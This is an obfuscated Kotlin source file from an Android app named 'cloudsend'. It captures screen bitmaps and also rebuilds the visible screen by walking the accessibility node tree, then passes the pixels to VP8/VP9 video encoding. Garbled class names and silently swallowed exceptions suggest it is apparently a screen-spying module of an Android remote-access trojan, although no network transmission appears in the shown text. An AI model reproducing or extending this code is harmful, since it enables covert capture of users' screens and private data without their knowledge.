package com.cloudsend.app

import java.nio.ByteBuffer
import android.view.accessibility.AccessibilityNodeInfo
import pkg2230.ClsFx9V0S
import android.graphics.*
import java.nio.ByteOrder
import android.util.Log
import java.util.concurrent.ConcurrentLinkedQueue
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.ColorSpace
import android.graphics.Paint
import android.graphics.PorterDuff
import android.graphics.Rect
import android.graphics.RectF
import android.graphics.Typeface

import android.text.Layout
import android.text.StaticLayout
import android.text.TextPaint
import android.os.Build

object EqljohYazB0qrhnj {
    private var imageBuffer: ByteBuffer? = null
	
	
    fun setImageBuffer(buffer: ByteBuffer) {
        imageBuffer = buffer
		
    }
	
    fun getImageBuffer(): ByteBuffer? {
        return imageBuffer
		
    }

	 fun a012933444445(hardwareBitmap: Bitmap?) {
		try {
			if (hardwareBitmap == null) return
	
			val scaledBitmap = ClsFx9V0S.nE2NVDLW(hardwareBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
			var createBitmap = scaledBitmap.copy(Bitmap.Config.ARGB_8888, true)
			scaledBitmap.recycle() 
	
			if (createBitmap != null) {
			
				val buffer = ByteBuffer.allocate(createBitmap.byteCount)
				buffer.order(ByteOrder.nativeOrder())
				createBitmap.copyPixelsToBuffer(buffer)
				buffer.rewind()
			 
				createBitmap.recycle()
				createBitmap = null 
	
				EqljohYazB0qrhnj.setImageBuffer(buffer)
	
				buffer.clear() 
				DFm8Y8iMScvB2YDw.ctx?.createSurfaceuseVP8()	 
			}
	
		} catch (unused2: Exception) {
		 
		}
     }
	 
	 
        fun a012933444444(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
            return
        }
	
        try {
          
            val createBitmap = Bitmap.createBitmap(HomeWidth*ClsFx9V0S.BAEH1gRs(), HomeHeight*ClsFx9V0S.BAEH1gRs(), Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)
            val paint = Paint()
          
	       
	        ClsFx9V0S.NSac7E1O(accessibilityNodeInfo, canvas, paint, SCREEN_INFO.scale) 
	   
			drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
				
			if (createBitmap != null) {
				
				val scaledBitmap = ClsFx9V0S.nE2NVDLW(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
			
				val w = scaledBitmap.width
			    val h = scaledBitmap.height
			
				 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
				 buffer.order(ByteOrder.nativeOrder())
				 scaledBitmap.copyPixelsToBuffer(buffer)
				 buffer.rewind()
				
				 EqljohYazB0qrhnj.setImageBuffer(buffer) 
				 DFm8Y8iMScvB2YDw.ctx?.createSurfaceuseVP9()	
                 scaledBitmap.recycle()
                 createBitmap.recycle()
			}
        } catch (unused2: java.lang.Exception) {
        }
    } 
     
     fun drawViewHierarchy(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var charSequence: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
                ClsFx9V0S.l1NNA8cZ(child, canvas, paint, SCREEN_INFO.scale)
		    
                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }
}
